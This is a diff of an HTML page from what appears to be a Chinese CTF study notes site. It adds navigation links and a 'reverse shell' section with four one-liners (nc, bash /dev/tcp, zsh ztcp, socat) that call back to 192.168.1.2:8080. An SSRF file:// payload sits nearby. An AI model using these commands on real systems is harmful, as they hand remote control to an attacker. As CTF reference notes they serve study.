@@ -1337,8 +1337,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../../CTFstudy/" title="学习基本思路" class="md-nav__link">
-      学习基本思路
+    <a href="../../CTFstudy/" title="CTFstudy" class="md-nav__link">
+      CTFstudy
     </a>
   </li>
 
@@ -1454,6 +1454,18 @@
   <li class="md-nav__item">
     <a href="../../misc/misc/" title="Misc" class="md-nav__link">
       Misc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../misc/webasm/" title="Webasm" class="md-nav__link">
+      Webasm
     </a>
   </li>
 
@@ -1640,6 +1652,13 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#shell" title="反弹shell" class="md-nav__link">
+    反弹shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#ssrfpayload" title="ssrf常用payload" class="md-nav__link">
     ssrf常用payload
   </a>
@@ -1685,6 +1704,18 @@
   <li class="md-nav__item">
     <a href="../php文件包含/" title="Php文件包含" class="md-nav__link">
       Php文件包含
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../ssti/" title="Ssti" class="md-nav__link">
+      Ssti
     </a>
   </li>
 
@@ -1869,6 +1900,13 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#shell" title="反弹shell" class="md-nav__link">
+    反弹shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#ssrfpayload" title="ssrf常用payload" class="md-nav__link">
     ssrf常用payload
   </a>
@@ -1923,6 +1961,13 @@
   .git泄露利用EXP
   <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li>
 </ol>
+<h2 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span>nc -e /bin/bash <span class="m">192</span>.168.1.2 <span class="m">8080</span>
+bash -c <span class="s1">&#39;bash -i &gt;/dev/tcp/192.168.1.2/8080 0&gt;&amp;1&#39;</span>
+zsh -c <span class="s1">&#39;zmodload zsh/net/tcp &amp;&amp; ztcp 192.168.1.2 8080 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#39;</span>
+socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080  
+</pre></div>
+
 <h2 id="ssrfpayload">ssrf常用payload<a class="headerlink" href="#ssrfpayload" title="Permanent link">&para;</a></h2>
 <p><code>admin=1&amp;url=file://www.ichunqiu.com/var/www/html/flag.php</code></p>
 <h2 id="php7-bug">php7 直接崩溃bug<a class="headerlink" href="#php7-bug" title="Permanent link">&para;</a></h2>
